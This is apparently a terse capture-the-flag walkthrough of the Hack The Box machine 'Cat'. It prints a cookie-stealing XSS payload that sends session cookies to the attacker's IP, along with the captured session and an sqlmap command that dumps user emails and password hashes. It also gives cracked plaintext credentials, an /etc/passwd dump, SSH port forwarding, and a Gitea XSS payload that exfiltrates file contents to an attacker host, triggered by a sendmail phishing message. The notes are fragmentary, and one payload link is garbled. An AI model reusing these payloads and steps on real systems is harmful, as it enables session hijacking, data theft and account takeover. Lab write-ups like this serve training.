

http://cat.htb/accept_cat.php


there is also a .git database Im able to fuzz this and find a description which im allowed to pull the files with all the endpoints in the web server. This is where i see the accept_cat.php endpoint.

This worked for XSS in the user parameter. to steal the PHPSESSION of admin. 


This happens when you set your username to the XSS payload. when you then register a contestant. The XSS payload below triggers. I had some trouble using a port so i ended up just hosting a python server on port 80.

<script>document.location='http://10.10.14.8/?c='+document.cookie;</script>

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [05/Feb/2025 12:22:20] "GET /?c=PHPSESSID=achc8u8ovdga4u92nac4mtjueb HTTP/1.1" 200 -
10.10.11.53 - - [05/Feb/2025 12:22:20] code 404, message File not found
10.10.11.53 - - [05/Feb/2025 12:22:20] "GET /favicon.ico HTTP/1.1" 404 -


I assume that because i cannot 


http://cat.htb/accept_cat.php

There is also a 

http://cat.htb/admin.php

endpoint

http://cat.htb/accept_cat.php

This endpoint had a vulnerability inside of the catName vulnerability. so i use SQLmap to dump the db and get this



[12:58:03] [INFO] retrieved: axel2017@gmail.com
[12:58:14] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f
[12:58:30] [INFO] retrieved: 1
[12:58:31] [INFO] retrieved: axel
[12:58:33] [INFO] retrieved: rosamendoza485@gmail.com
[12:58:42] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c
[12:58:59] [INFO] retrieved: 2
[12:59:00] [INFO] retrieved: rosa


[12:59:04] [INFO] retrieved: robertcervantes2000@gmail.com
[12:59:16] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad
[12:59:31] [INFO] retrieved: 3
[12:59:31] [INFO] retrieved: robert
[12:59:34] [INFO] retrieved: fabiancarachure2323@gmail.com
[12:59:51] [INFO] retrieved: 39e153e825c4a3d31

```
sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=mal" --cookie="PHPSESSID=6igj37k24aq49a4vgpevpplca3" -p catName --dbms=SQLite -T users --dump
```





Rosas Password cracks on crack station and i get the password


rosa : soyunaprincesarosa


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
smmta:x:115:120:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:116:121:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false


the only other people in this are named 

axel
rosa 
jobert 
_laurel


I look into the APACHE logs for these users one by one and see this when i look for axel
grep axel /var/log/apache2/access.log


axel : aNdZwgC4tI9gnVXv_e3Q

running locally under port 3000 something sticks out to me.

also does the user jobert and git. as they both have console.

so lets checkout port 3000 by port forwarding
ssh -L 3000:localhost:3000 axel@10.10.11.53

oh also it says you have mail when i login so we check /var/mail


We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.



says theres a endpoint at 3000 

The web app is running gitea 1.23.1 which is vuln to 

https://www.exploit-db.com/exploits/52077


axel can login to the gitea with the creds


axel : aNdZwgC4tI9gnVXv_e3Q

XSS payload.

```
<a href="javascript:fetch('[http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response](http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php'\).then\(response "http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response") => response.text()).then(data => fetch('[http://10.10.xx.xx/?response=](http://10.10.14.10/?response= "http://10.10.xx.xx/?response=")' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>

```

http://localhost:3000/axel/repos/

You must do these steps.
 
1. Create new repo
2. Make the description this payload above to read index.php file and name it repos
3. create a file inside the repo named repos so that it can be accessed
4. Setup a python listener on port 80
5. echo -e "Subject: test \n\nHello check my repo http://localhost:3000/axel/repos" | sendmail jobert@localhost
6. jobert clicks


echo -e "Subject: test \n\nHello check my repo http://localhost:3000/axel/repos" | sendmail jobert@localhost


this gives you 

- Username: admin

- Password: IKw75eR0MR7CMIxhH0


which allows you to su to root and get root.txt